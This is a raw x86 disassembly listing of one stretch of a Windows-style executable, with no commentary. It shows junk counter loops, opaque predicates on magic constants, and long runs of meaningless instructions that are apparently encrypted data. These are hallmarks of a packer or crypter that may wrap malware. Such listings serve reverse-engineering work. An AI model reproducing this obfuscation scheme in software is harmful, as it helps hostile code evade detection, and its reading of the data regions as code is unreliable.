  40181a:	xchg   BYTE PTR [ebp+0x76],ch
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
  4018bd:	cmp    DWORD PTR ds:0x430363,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x430363
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x430363,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x475c7f3e
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a0d
  401a76:	or     BYTE PTR [edx+0x51e03cd9],cl
  401a7c:	imul   esp,DWORD PTR [ebx+0x28],0x53
  401a80:	sub    cl,cl
  401a82:	mov    ecx,DWORD PTR [eax+0x2a20c877]
  401a88:	sbb    al,0xd
  401a8a:	xchg   edi,eax
  401a8b:	mov    esi,0x4ba9aae0
  401a90:	push   0x8
  401a92:	test   al,0x68
  401a94:	lods   eax,DWORD PTR ds:[esi]
  401a95:	in     eax,dx
  401a96:	mov    al,0xc8
  401a98:	mov    esp,0x68d9a2e3
  401a9d:	leave  
  401a9e:	in     eax,0x88
  401aa0:	mov    esp,0xb32812fb
  401aa5:	jge    0x401b0a
  401aa7:	dec    esp
  401aa8:	sub    DWORD PTR [edx-0x139cda1a],0x623f7513
  401ab2:	aaa    
  401ab3:	int    0x4e
  401ab5:	add    BYTE PTR [esp+ecx*2-0x30],dl
  401ab9:	jecxz  0x401afc
  401abb:	push   ebx
  401abc:	mov    esp,0x2d132ec9
  401ac1:	xchg   ebp,eax
  401ac2:	rol    DWORD PTR [ecx-0x1e],1
  401ac5:	jg     0x401a9e
  401ac7:	adc    al,0x12
  401ac9:	pop    ebx
  401aca:	adc    eax,0xc0e7cffd
  401acf:	shl    DWORD PTR [edi-0x64823e98],cl
  401ad5:	pop    edx
  401ad6:	jnp    0x401b2b
  401ad8:	cwde   
  401ad9:	fnstsw WORD PTR ds:0x758700a8
  401adf:	or     BYTE PTR [esi+eiz*8+0x36],0x67
  401ae4:	inc    eax
  401ae5:	cmp    ebx,DWORD PTR [esi-0x4200e102]
  401aeb:	fcomp  QWORD PTR ds:0xc1203bcf
  401af1:	jmp    0x401a8b
  401af3:	add    BYTE PTR [ecx-0x37],bl
  401af6:	sbb    BYTE PTR [esi+0x15578c84],0xc8
  401afd:	stos   DWORD PTR es:[edi],eax
  401afe:	test   DWORD PTR ds:0x812548d5,ecx
  401b04:	jg     0x401b5e
  401b06:	scas   eax,DWORD PTR es:[edi]
  401b07:	ja     0x401b3d
  401b09:	aaa    
  401b0a:	mov    dh,0xfc
  401b0c:	mov    eax,ds:0x94bebf17
  401b11:	arpl   WORD PTR [esi+esi*8+0x61e79958],sp
  401b18:	sub    edx,esi
  401b1a:	mov    bh,0x77
  401b1c:	test   al,0xf0
  401b1e:	imul   ebp,esp,0xffffffed
  401b21:	test   ch,ah
  401b23:	outs   dx,DWORD PTR ds:[esi]
  401b24:	shr    DWORD PTR [ecx+0x20],cl
  401b27:	pop    ds
  401b28:	xchg   edi,eax
  401b29:	jne    0x401ad8
  401b2b:	cmp    DWORD PTR [ebp-0x74],eax
  401b2e:	push   esi
  401b2f:	push   cs
  401b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b31:	hlt    
  401b32:	push   esp
  401b33:	jg     0x401b42
  401b35:	pusha  
  401b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b37:	sub    edi,ebx
  401b39:	pushf  
  401b3a:	and    al,0x51
  401b3c:	je     0x401af8
  401b3e:	shl    DWORD PTR [edx],cl
  401b40:	mov    edi,0xe170c188
  401b45:	cmp    edx,DWORD PTR [ecx+0x5c077432]
  401b4b:	cmp    DWORD PTR [ecx-0x6c],0xfe65da1b
  401b52:	and    dh,ah
  401b54:	(bad)  
  401b55:	ficomp WORD PTR [ecx+eiz*2]
  401b58:	imul   ecx,DWORD PTR [eax+0x5c],0x52effbdd
  401b5f:	scas   al,BYTE PTR es:[edi]
  401b60:	aad    0x36
  401b62:	xchg   esp,esi
  401b64:	std    
  401b65:	lods   eax,DWORD PTR ds:[esi]
  401b66:	or     BYTE PTR ds:0x4c3cb413,bh
  401b6c:	add    al,0xfd
  401b6e:	in     eax,dx
  401b6f:	sub    cl,BYTE PTR [ecx+esi*1-0x6d]
  401b73:	punpcklbw mm1,mm4
  401b76:	sbb    DWORD PTR [ecx-0x4061160],ecx
  401b7c:	mov    ds:0x1e7f6c6f,al
  401b81:	xor    al,0xc8
  401b83:	lock lea esp,[esi-0x19433ae8]
  401b8a:	pop    esp
  401b8b:	mov    esp,0xd5b3824b
  401b90:	mov    ds:0xee7be1b5,al
  401b95:	neg    BYTE PTR [edx]
  401b97:	add    ah,BYTE PTR [edx+edx*8]
  401b9a:	shr    BYTE PTR [ebx],0x65
  401b9d:	add    DWORD PTR [ebx+0x3f],eax
  401ba0:	mov    dh,0x80
  401ba2:	sub    eax,edi
  401ba4:	test   BYTE PTR ds:0xb18a3597,bl
  401baa:	enter  0xbc07,0xc5
  401bae:	xor    al,0xa8
  401bb0:	pxor   mm1,QWORD PTR [ecx]
  401bb3:	loope  0x401be5
  401bb5:	daa    
  401bb6:	rcl    edx,1
  401bb8:	xchg   ebp,eax
  401bb9:	mov    gs,WORD PTR [esi]
  401bbb:	mov    ch,BYTE PTR [esi+0x1fc2de67]
  401bc1:	sub    cl,BYTE PTR [eax+0xf4b5ec0]
  401bc7:	imul   edx,esi,0xffffffad
  401bca:	sub    bl,BYTE PTR [edi-0x34d3492c]
  401bd0:	mov    eax,esp
  401bd2:	in     al,dx
  401bd3:	(bad)  [edi]
  401bd5:	cdq    
  401bd6:	jmp    0x242e:0xa80bc693
  401bdd:	sub    BYTE PTR ds:0xf354d21f,al
  401be3:	sub    eax,esp
  401be5:	icebp  
  401be6:	pop    ss
  401be7:	fimul  DWORD PTR [ebx]
  401be9:	aaa    
  401bea:	test   BYTE PTR [esi+0x1d],dh
  401bed:	push   cs
  401bee:	push   sp
  401bf0:	push   0xfffffff3
  401bf2:	pop    edi
  401bf3:	in     al,dx
  401bf4:	mov    edi,ecx
  401bf6:	nop
  401bf7:	and    DWORD PTR [eax+0x5a],ecx
  401bfa:	xchg   edi,eax
  401bfb:	mov    esi,0x7d28d802
  401c00:	xchg   edi,eax
  401c01:	add    eax,0xbd5c2bf
  401c06:	data16 fnstcw WORD PTR [edx]
  401c09:	scas   al,BYTE PTR es:[edi]
  401c0a:	mov    DWORD PTR [ecx+esi*8+0x60],eax
  401c0e:	mov    dl,0x9e
  401c10:	je     0x401b99
  401c12:	dec    ebx
  401c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c14:	in     al,0xdf
  401c16:	pop    esp
  401c17:	sub    edi,eax
  401c19:	add    BYTE PTR [esi],ah
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	pop    ecx
  401c91:	loope  0x401ca8
  401c93:	mov    bh,0x30
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cf2
  401c9d:	in     al,dx
  401c9e:	cmp    ch,BYTE PTR [esi+0x7b]
  401ca1:	test   BYTE PTR [ecx+0x68],bh
  401ca4:	in     al,0x3e
  401ca6:	inc    ebx
  401ca7:	gs pop esi
  401ca9:	or     BYTE PTR es:[edi+0x2e],0x31
  401cae:	ror    BYTE PTR [ebx-0x58],cl
  401cb1:	push   edi
  401cb2:	int    0x89
  401cb4:	mov    edi,0x6e6b5d97
  401cb9:	cmp    eax,0x62fff9cc
  401cbe:	push   edi
  401cbf:	(bad)  
  401cc0:	xchg   edi,eax
  401cc1:	dec    eax
  401cc2:	ds pop esi
  401cc4:	add    eax,0x9a080142
  401cc9:	push   ecx
  401cca:	adc    BYTE PTR [eax+0x9],ah
  401ccd:	addr16 mov ebp,0xf2649d47
  401cd3:	je     0x401c67
  401cd5:	in     eax,0xfd
  401cd7:	dec    edi
  401cd8:	pop    ss
  401cd9:	(bad)  
  401cda:	call   0x9a5b1bb2
  401cdf:	mov    ebx,0xa7c3b3d1
  401ce4:	mov    cl,0x0
  401ce6:	pop    ss
  401ce7:	enter  0x47a2,0xb3
  401ceb:	ficomp DWORD PTR [edi-0x2]
  401cee:	hlt    
  401cef:	dec    edi
  401cf0:	retf   0xb00a
  401cf3:	iret   
  401cf4:	xor    DWORD PTR [ebx],0x1f297265
  401cfa:	push   eax
  401cfb:	lea    edx,[ecx+0x2e]
  401cfe:	push   ebx
  401cff:	popf   
  401d00:	js     0x401d06
  401d02:	mov    ds:0x3cd27f6c,al
  401d07:	mov    ds:0xe6463cb0,eax
  401d0c:	and    eax,0x31544f53
  401d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d12:	out    dx,al
  401d13:	jno    0x401d31
  401d15:	les    edx,FWORD PTR [esi]
  401d17:	inc    eax
  401d18:	cmp    cl,BYTE PTR [ebx+edx*1-0x7b1514e8]
  401d1f:	mov    al,ds:0x410282ce
  401d24:	inc    edx
  401d25:	push   es
  401d26:	pop    edx
  401d27:	(bad)  
  401d28:	call   0x10a5454c
  401d2d:	adc    dh,BYTE PTR [ecx+0x7f]
  401d30:	nop
  401d31:	add    eax,0x77b704d7
  401d36:	push   ds
  401d37:	call   0xdd4b28b
  401d3c:	xchg   ebp,edx
  401d3e:	or     cl,BYTE PTR [ebx]
  401d40:	xchg   DWORD PTR [ebx-0x721b4d49],edx
  401d46:	sbb    ecx,DWORD PTR [edi]
  401d48:	sbb    DWORD PTR [edx-0x1503e038],ebx
  401d4e:	jle    0x401d36
  401d50:	jne    0x401cd2
  401d52:	cmp    dh,BYTE PTR [ebx-0x9]
  401d55:	sti    
  401d56:	ins    DWORD PTR es:[edi],dx
  401d57:	out    dx,al
  401d58:	ja     0x401cff
  401d5a:	xchg   esi,eax
  401d5b:	push   esp
  401d5c:	je     0x401d4f
  401d5e:	xchg   esi,eax
  401d5f:	div    DWORD PTR [ebx+0x2b]
  401d62:	sbb    BYTE PTR [edx],0xed
  401d65:	out    dx,eax
  401d66:	mov    edi,0x5272eedc
  401d6b:	loope  0x401d0c
  401d6d:	sub    eax,0x48dfe98b
  401d72:	daa    
  401d73:	out    dx,eax
  401d74:	clc    
  401d75:	add    ebx,ebp
  401d77:	sbb    DWORD PTR [eax],ebp
  401d79:	cmp    ch,BYTE PTR [edx]
  401d7b:	push   ds
  401d7c:	repnz cdq 
  401d7e:	sbb    BYTE PTR [esi+0x12cf609],dl
  401d84:	fst    st(7)
  401d86:	sub    BYTE PTR [ecx+eax*1-0x3ba59d62],ch
  401d8d:	mov    esp,0xe9cc9932
  401d92:	(bad)  
  401d93:	jo     0x401dc2
  401d95:	sbb    ecx,DWORD PTR [esp+ecx*8-0x7ad03fe4]
  401d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d9d:	jg     0x401d83
  401d9f:	fisubr DWORD PTR [ebx]
  401da1:	mov    ebx,0x5386a455
  401da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401da7:	pop    es
  401da8:	mov    bh,BYTE PTR [ebp+0x52]
  401dab:	xchg   BYTE PTR [esi+0x32dc4db0],ah
  401db1:	int3   
  401db2:	out    0x6,eax
  401db4:	(bad)  
  401db5:	jl     0x401e26
  401db7:	out    0x9a,eax
  401db9:	sbb    esi,DWORD PTR [esi]
  401dbb:	enter  0x6698,0x9
  401dbf:	sbb    edi,DWORD PTR [edi-0x52]
  401dc2:	xor    ebx,DWORD PTR [eax+ebp*4-0x1d]
  401dc6:	xchg   esp,eax
  401dc7:	out    0x2e,al
  401dc9:	cs repnz dec ebp
  401dcc:	xor    eax,0xf25042e0
  401dd1:	shr    BYTE PTR [edi+0x75dfc999],1
  401dd7:	adc    eax,0x4aaf0b56
  401ddc:	test   BYTE PTR [edx+0x60c473a9],ch
  401de2:	fcomi  st,st(0)
  401de4:	xchg   edx,eax
  401de5:	adc    BYTE PTR [ebp-0x6f3f0a5f],bh
  401deb:	pop    esp
  401dec:	into   
  401ded:	inc    ecx
  401dee:	fwait
  401def:	out    dx,eax
  401df0:	repnz xor eax,0xac32de2
  401df6:	inc    esi
  401df7:	sub    eax,esp
  401df9:	xchg   esp,eax
  401dfa:	mov    ds:0xe6b97f1,eax
  401dff:	retf   0x3a0b
  401e02:	jle    0x401e5c
  401e04:	jnp    0x401dad
  401e06:	mov    esp,0xa95bbc78
  401e0b:	or     al,0xb3
  401e0d:	ficom  WORD PTR [esi]
  401e0f:	jecxz  0x401e27
  401e11:	mov    ebx,0x5965df08
  401e16:	push   edx
  401e17:	jg     0x401e2f
  401e19:	and    DWORD PTR [ebx+0x3d71fabb],0x4a664662
  401e23:	retf   
  401e24:	sub    dh,BYTE PTR [edi-0x3b0f8bce]
  401e2a:	mov    ds:0x91c1df48,eax
  401e2f:	and    cl,BYTE PTR [ebp+esi*8+0x507b8959]
  401e36:	popa   
  401e37:	pushf  
  401e38:	cmp    edi,DWORD PTR [ebp-0x7143e91a]
  401e3e:	imul   esp,DWORD PTR [eax+0x27],0x6b
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	ret    
  401e81:	pop    ds
  401e82:	pop    esp
  401e83:	pop    ss
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e5b
  401e8d:	pop    ebp
  401e8e:	ficomp WORD PTR [ebp+0x44]
  401e91:	and    ebp,ebp
  401e93:	xchg   esp,eax
  401e94:	mov    eax,ds:0x63976cda
  401e99:	sbb    DWORD PTR [esp+esi*2-0x2a4a55e1],ebp
  401ea0:	sbb    eax,0x1fcb978e
  401ea5:	mov    ebx,0xedc58abf
  401eaa:	or     esp,ebp
  401eac:	jp     0x401e7f
  401eae:	(bad)  
  401eaf:	out    dx,eax
  401eb0:	mov    ch,0xe8
  401eb2:	retf   
  401eb3:	sar    ch,cl
  401eb5:	xchg   esi,eax
  401eb6:	int    0xc0
  401eb8:	das    
  401eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eba:	(bad)  
  401ebc:	loopne 0x401e42
  401ebe:	pop    esp
  401ebf:	pushfw 
  401ec1:	ret    0xc7f8
  401ec4:	adc    DWORD PTR [esi],esi
  401ec6:	sub    edi,DWORD PTR [esi-0x7f]
  401ec9:	dec    ebx
  401eca:	(bad)  
  401ecc:	adc    ah,bh
  401ece:	xchg   ecx,eax
  401ecf:	test   eax,0x7526d1c7
  401ed4:	cmp    eax,0x2dd053f5
  401ed9:	xor    DWORD PTR [esi+0x5d],edx
  401edc:	lods   al,BYTE PTR ds:[esi]
  401edd:	inc    ebx
  401ede:	pop    eax
  401edf:	mov    cl,0xe5
  401ee1:	enter  0x4614,0x1
  401ee5:	not    DWORD PTR [edx-0x9]
  401ee8:	push   edi
  401ee9:	mov    ebx,0x6247f06f
  401eee:	rcl    DWORD PTR [esi],1
  401ef0:	mov    edi,0xfda2741e
  401ef5:	pop    ecx
  401ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ef7:	fadd   DWORD PTR [esp+edx*8+0x43ffc6e5]
  401efe:	cmp    dh,BYTE PTR [edx+0xf]
  401f01:	arpl   WORD PTR [ebx],sp
  401f03:	int3   
  401f04:	repz retf 0x9bf6
  401f08:	xor    al,0xbe
  401f0a:	xchg   ecx,eax
  401f0b:	sub    esi,esi
  401f0d:	cmp    ebp,esp
  401f0f:	ins    BYTE PTR es:[edi],dx
  401f10:	nop
  401f11:	test   BYTE PTR [ecx],ch
  401f13:	mov    ebp,0x89ebb4cf
  401f18:	xlat   BYTE PTR ds:[ebx]
  401f19:	ror    BYTE PTR [eax],cl
  401f1b:	jge    0x401f96
  401f1d:	mov    cl,0x6b
  401f1f:	pop    ss
  401f20:	add    DWORD PTR es:[ecx],eax
  401f23:	push   cs
  401f24:	sub    esp,edx
  401f26:	push   esp
  401f27:	cmp    ah,bh
  401f29:	(bad)  
  401f2a:	cwde   
  401f2b:	addr16 mov bh,0x9f
  401f2e:	push   esi
  401f2f:	sti    
  401f30:	and    BYTE PTR [ebx+0x42],bh
  401f33:	xlat   BYTE PTR ds:[ebx]
  401f34:	dec    ebx
  401f35:	aaa    
  401f36:	pushf  
  401f37:	xor    ch,BYTE PTR [edi]
  401f39:	std    
  401f3a:	fcomi  st,st(6)
  401f3c:	push   ebp
  401f3d:	(bad)  [eax+esi*2-0x16a5a8c9]
  401f44:	ja     0x401f29
  401f46:	jmp    0x401ef7
  401f48:	fisttp QWORD PTR [edx+0x69c5f221]
  401f4e:	popf   
  401f4f:	sub    ecx,DWORD PTR [edx]
  401f51:	mov    ch,0xb7
  401f53:	out    dx,al
  401f54:	(bad)  
  401f55:	out    dx,al
  401f56:	cmp    dh,BYTE PTR [edi+esi*2-0x46]
  401f5a:	adc    DWORD PTR [ebx-0x53],edi
  401f5d:	in     al,0x0
  401f5f:	shl    DWORD PTR [eax-0x23],1
  401f62:	xchg   ebx,eax
  401f63:	sub    al,BYTE PTR [esi+edi*4-0x1b]
  401f67:	mov    eax,0x9037850e
  401f6c:	push   cs
  401f6d:	setnp  BYTE PTR [ecx+edx*8]
  401f71:	mov    dh,0x61
  401f73:	push   cs
  401f74:	jle    0x401f99
  401f76:	mov    al,ds:0x8037a87f
  401f7b:	out    dx,al
  401f7c:	cwde   
  401f7d:	pop    ebp
  401f7e:	fwait
  401f7f:	jge    0x401f54
  401f81:	mov    esi,0x8e868203
  401f86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f87:	(bad)  
  401f88:	pop    ecx
  401f89:	lock fist WORD PTR [ecx+0x5c310945]
  401f90:	push   ecx
  401f91:	mov    esp,0x3323f13c
  401f96:	sbb    eax,0x72696ae
  401f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9c:	add    esi,DWORD PTR [ebp+0x3]
  401f9f:	out    dx,al
  401fa0:	adc    BYTE PTR [ebx],ch
  401fa2:	pushf  
  401fa3:	scas   al,BYTE PTR es:[edi]
  401fa4:	and    al,0x5f
  401fa6:	push   0xb5d2fd39
  401fab:	mov    eax,ds:0x572af98c
  401fb0:	test   DWORD PTR [ecx-0x34],0x8354f4d7
  401fb7:	cdq    
  401fb8:	shl    ch,1
  401fba:	pop    edi
  401fbb:	mov    eax,ds:0xaf55f304
  401fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fc1:	adc    BYTE PTR [edx-0x4d],ah
  401fc4:	loope  0x401f60
  401fc6:	mov    ebp,0xa233e744
  401fcb:	pop    esi
  401fcc:	lea    edi,[edx+0x25]
  401fcf:	nop
  401fd0:	test   al,0xcf
  401fd2:	cmc    
  401fd3:	cmp    al,0x5f
  401fd5:	or     DWORD PTR [ebp+0x34],eax
  401fd8:	xlat   BYTE PTR ds:[ebx]
  401fd9:	pop    edx
  401fda:	ds cmp eax,0x85e0561c
  401fe0:	icebp  
  401fe1:	push   edi
  401fe2:	pop    ebx
  401fe3:	xchg   DWORD PTR [ecx],eax
  401fe5:	xchg   esi,eax
  401fe6:	and    DWORD PTR [edi-0x26be845c],esp
  401fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fed:	dec    ebx
  401fee:	jmp    0x94a72af8
  401ff3:	clc    
  401ff4:	pop    ss
  401ff5:	push   cs
  401ff6:	aas    
  401ff7:	shl    DWORD PTR [edx],0x8c
  401ffa:	das    
  401ffb:	mov    ds:0xe0d8294f,eax
  402000:	lds    ecx,FWORD PTR [ecx]
  402002:	add    edi,0xfffffffd
  402005:	scas   al,BYTE PTR es:[edi]
  402006:	clc    
  402007:	dec    ebp
  402008:	jne    0x402016
  40200a:	out    dx,al
  40200b:	add    esi,DWORD PTR [ebx+ebx*1+0x78]
  40200f:	shl    BYTE PTR [ebp+edx*8-0x17],1
  402013:	xor    DWORD PTR [edx-0x62],0xd01a57b7
  40201a:	retf   0xa529
  40201d:	fdivr  DWORD PTR [ebx]
  40201f:	mov    ebx,0x20223907
  402024:	jp     0x401fe2
  402026:	adc    DWORD PTR [ebx],0xc39c99d4
  40202c:	out    0x78,al
  40202e:	dec    edx
  40202f:	shl    ebx,0x66
  402032:	add    eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
